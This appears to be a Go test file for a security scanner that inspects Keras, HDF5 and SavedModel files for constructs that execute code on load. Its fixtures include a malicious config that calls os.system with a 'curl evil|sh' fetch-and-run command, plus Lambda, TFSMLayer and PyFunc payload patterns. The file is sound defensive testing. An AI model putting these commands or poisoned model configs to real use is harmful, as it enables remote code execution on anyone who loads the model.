package inspector

import (
	"archive/zip"
	"os"
	"path/filepath"
	"testing"
)

// writeKerasArchive builds a real Keras v3 file: a zip holding config.json,
// metadata.json and a weights entry. Building the real container matters
// because the inspector opens it as one.
func writeKerasArchive(t *testing.T, path, config string) {
	t.Helper()
	f, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	zw := zip.NewWriter(f)
	for name, body := range map[string]string{
		"config.json":      config,
		"metadata.json":    `{"keras_version":"3.7.0","date_saved":"2026-08-19"}`,
		"model.weights.h5": "\x89HDF\r\n\x1a\n",
	} {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
}

func inspectOne(t *testing.T, dir string) *Report {
	t.Helper()
	report, err := Inspect(dir, DefaultLimits())
	if err != nil {
		t.Fatal(err)
	}
	return report
}

func hasFinding(r *Report, id string) bool {
	for _, f := range r.Findings {
		if f.ID == id {
			return true
		}
	}
	return false
}

func findingWithID(t *testing.T, r *Report, id string) string {
	t.Helper()
	for _, f := range r.Findings {
		if f.ID == id {
			return f.Severity
		}
	}
	t.Fatalf("no %s finding; got %v", id, findingIDs(r))
	return ""
}

// A Lambda layer serialises a Python code object into the model and runs it on
// load. Before this existed, a .keras file was reported as a present format
// and examined by nothing, which reads as "checked and clean".
func TestKerasLambdaLayerIsCritical(t *testing.T) {
	dir := t.TempDir()
	writeKerasArchive(t, filepath.Join(dir, "model.keras"), `{
	  "module": "keras",
	  "class_name": "Sequential",
	  "config": {"layers": [
	    {"module": "keras.layers", "class_name": "Lambda",
	     "config": {"function": ["4wEAAAAAAAAA", null, null]}}
	  ]}
	}`)

	report := inspectOne(t, dir)
	if got := findingWithID(t, report, FindingKerasLambda); got != "Critical" {
		t.Errorf("a Lambda layer executes serialized Python on load; severity %q", got)
	}
}

// CVE-2026-1462: TFSMLayer loads an external SavedModel from a path in the
// config, unconditionally, even under safe_mode=True.
func TestKerasTFSMLayerIsCritical(t *testing.T) {
	dir := t.TempDir()
	writeKerasArchive(t, filepath.Join(dir, "model.keras"), `{
	  "class_name": "Sequential",
	  "config": {"layers": [
	    {"module": "keras.layers", "class_name": "TFSMLayer",
	     "config": {"filepath": "/mnt/attacker/saved_model", "call_endpoint": "serve"}}
	  ]}
	}`)

	report := inspectOne(t, dir)
	if got := findingWithID(t, report, FindingKerasExternalModel); got != "Critical" {
		t.Errorf("TFSMLayer severity %q", got)
	}
}

// CVE-2025-1550: an altered config.json names arbitrary modules and functions
// to be imported and called during loading, bypassing safe_mode.
func TestKerasForeignModuleIsReported(t *testing.T) {
	dir := t.TempDir()
	writeKerasArchive(t, filepath.Join(dir, "model.keras"), `{
	  "class_name": "Sequential",
	  "config": {"layers": [
	    {"module": "os", "class_name": "system", "config": {"args": ["curl evil|sh"]}}
	  ]}
	}`)

	report := inspectOne(t, dir)
	if got := findingWithID(t, report, FindingKerasForeignModule); got != "High" {
		t.Errorf("a config importing os severity %q", got)
	}
}

// The ordinary case must stay quiet. A scanner that fires on every Keras model
// gets switched off, and then it protects nothing.
func TestOrdinaryKerasModelIsClean(t *testing.T) {
	dir := t.TempDir()
	writeKerasArchive(t, filepath.Join(dir, "model.keras"), `{
	  "module": "keras",
	  "class_name": "Sequential",
	  "config": {"layers": [
	    {"module": "keras.layers", "class_name": "Dense",
	     "config": {"units": 64, "activation": "relu"}},
	    {"module": "keras.layers", "class_name": "Dropout", "config": {"rate": 0.2}}
	  ]}
	}`)

	report := inspectOne(t, dir)
	for _, id := range []string{FindingKerasLambda, FindingKerasExternalModel, FindingKerasForeignModule} {
		if hasFinding(report, id) {
			t.Errorf("an ordinary Dense/Dropout model must not produce %s", id)
		}
	}
}

// Legacy tf.keras stores the same configuration as a JSON attribute inside an
// HDF5 file, and legacy loading has no safe_mode at all.
func TestLegacyHDF5LambdaIsDetected(t *testing.T) {
	dir := t.TempDir()
	body := append([]byte{0x89, 'H', 'D', 'F', '\r', '\n', 0x1a, '\n'}, make([]byte, 64)...)
	body = append(body, []byte(`model_config{"class_name": "Sequential", "config": {"layers": [{"class_name": "Lambda", "config": {"function": ["4wEA", null, null]}}]}}`)...)
	if err := os.WriteFile(filepath.Join(dir, "model.h5"), body, 0o644); err != nil {
		t.Fatal(err)
	}

	report := inspectOne(t, dir)
	if !hasFinding(report, FindingKerasLambda) {
		t.Fatalf("a Lambda layer in legacy HDF5 must be detected; got %v", findingIDs(report))
	}
}

// A file whose extension declares a Keras model and whose header is not HDF5
// has been renamed. Every other check in this package prefers content over
// extension for the same reason.
func TestKerasNameWithoutHDF5HeaderIsFlagged(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "model.h5"), []byte("not an hdf5 file at all"), 0o644); err != nil {
		t.Fatal(err)
	}

	report := inspectOne(t, dir)
	if !hasFinding(report, FindingKerasUnreadable) {
		t.Fatalf("a mislabelled .h5 must be reported; got %v", findingIDs(report))
	}
}

// The same detection has to work when the attacker drops the extension.
func TestRenamedHDF5IsStillInspected(t *testing.T) {
	dir := t.TempDir()
	body := append([]byte{0x89, 'H', 'D', 'F', '\r', '\n', 0x1a, '\n'}, make([]byte, 32)...)
	body = append(body, []byte(`{"class_name": "TFSMLayer", "config": {"filepath": "/tmp/x"}}`)...)
	if err := os.WriteFile(filepath.Join(dir, "weights.dat"), body, 0o644); err != nil {
		t.Fatal(err)
	}

	report := inspectOne(t, dir)
	if !hasFinding(report, FindingKerasExternalModel) {
		t.Fatalf("HDF5 detected by header must still be inspected; got %v", findingIDs(report))
	}
}

// A SavedModel graph is data until it contains an operation that reaches
// outside the graph. PyFunc calls back into Python.
func TestSavedModelPyFuncIsReported(t *testing.T) {
	dir := t.TempDir()
	// NodeDef.op is a plain string field, so the operation name appears
	// verbatim in the serialized graph.
	body := append([]byte("\x08\x01\x12\x0asaved_model"), []byte("\x1a\x06PyFunc")...)
	if err := os.WriteFile(filepath.Join(dir, "saved_model.pb"), body, 0o644); err != nil {
		t.Fatal(err)
	}

	report := inspectOne(t, dir)
	if got := findingWithID(t, report, FindingSavedModelOp); got != "High" {
		t.Errorf("a PyFunc operation severity %q", got)
	}
}

func TestOrdinarySavedModelIsClean(t *testing.T) {
	dir := t.TempDir()
	body := []byte("\x08\x01\x12\x0asaved_model\x1a\x06MatMul\x1a\x07BiasAdd\x1a\x04Relu")
	if err := os.WriteFile(filepath.Join(dir, "saved_model.pb"), body, 0o644); err != nil {
		t.Fatal(err)
	}

	report := inspectOne(t, dir)
	if hasFinding(report, FindingSavedModelOp) {
		t.Errorf("MatMul/BiasAdd/Relu is an ordinary graph; got %v", findingIDs(report))
	}
}

// The gap this closes, stated as a test: the summary named these formats and
// nothing examined them, so a clean report was indistinguishable from an
// unexamined one.
func TestEveryFormatTheSummaryNamesIsAlsoInspected(t *testing.T) {
	for _, name := range []string{"model.keras", "model.h5", "saved_model.pb"} {
		if formatOf(name) == "" {
			t.Fatalf("%s: formatOf reports nothing", name)
		}
		if !executesOnLoad(name) {
			t.Errorf("%s is reported as a present format and treated as inert", name)
		}
	}
}
